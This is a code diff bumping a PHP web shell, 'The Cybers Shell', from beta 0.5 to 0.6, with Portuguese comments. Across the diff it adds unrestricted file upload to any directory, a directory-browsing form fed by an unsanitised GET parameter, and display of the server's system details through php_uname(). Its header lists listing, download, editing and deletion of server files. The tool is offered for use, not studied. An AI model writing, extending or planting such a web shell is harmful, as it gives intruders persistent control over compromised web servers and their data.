@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>The Cybers Shell [beta 0.5]</title>
+	<title>The Cybers Shell [beta 0.6]</title>
 
 	<style>
 
@@ -18,11 +18,12 @@
 			text-align: left;
 			width:200px;
 		}
-		.upar{
+		form{
 			background-color:#111;
 			width:305px;
 			padding:5px;
 			margin-top:10px;
+			margin-bottom:10px;
 		}
 		a{
 			color:red;
@@ -30,18 +31,22 @@
 	</style>
 </head>
 <body>
-<small>[Beta 0.5] www.fb.com/TheCybersTeam</small>
+<small>[Beta 0.6] www.fb.com/TheCybersTeam</small>
+<br />
+<small><?php echo php_uname();?></small>
 <h1><a href="shell.php" title='Home'>The Cybers Shell</a></h1>
 
 <?php
 /*
 	By: The Cybers Team
-	Versão: Beta 0.5
+	Versão: Beta 0.6
 	[ok] listar
 	[no] visualizar
 	[ok] download
 	[ok] editar
 	[ok] deletar
+	[ok] upload
+	[ok] navegar
 
 */
 	// Configuração ==================================================
@@ -151,10 +156,20 @@
 
 	}
 
+
 	function upload($arquivo, $diretorio){
 		if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
 			echo "Upado com sucesso! :D";
 		}
+	}
+
+	function navegar($diretorio){
+		echo "
+		<form class=upar action='shell.php' method='get'>
+			<input style='width:220px' type='text' name='ls' value='$diretorio'/>
+			<input type='submit' value='Acessar'/>
+		</form>";
+
 	}
 
 	// POST e GET ==================================================
@@ -178,6 +193,7 @@
 	}
 
 	// Shell =======================================================
+	navegar($diretorio);
 	listar($diretorio);
 	upar($diretorio);
 
